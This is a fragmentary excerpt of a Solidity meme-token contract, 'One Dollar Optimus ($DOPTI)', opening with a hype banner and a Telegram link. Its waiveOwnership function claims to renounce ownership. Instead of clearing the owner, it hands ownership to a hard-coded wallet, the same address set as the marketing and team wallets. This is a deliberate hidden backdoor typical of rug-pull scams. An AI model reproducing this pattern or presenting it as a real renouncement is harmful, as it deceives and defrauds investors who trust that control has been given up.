...
/**
 ...
 One Dollar Optimus - $DOPTI

Lets join in on DOSHI & DOKI Hype!

Telegram: https://t.me/DOPTIportal
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb0F3856CB89B3A22276f2C9fA703F5D16a2b8523);
    }
...
contract OneDollarOptimus is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "One Dollar Optimus ";
    string private _symbol = "$DOPTI";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xb0F3856CB89B3A22276f2C9fA703F5D16a2b8523);
    address payable private teamWalletAddress = payable(0xb0F3856CB89B3A22276f2C9fA703F5D16a2b8523);
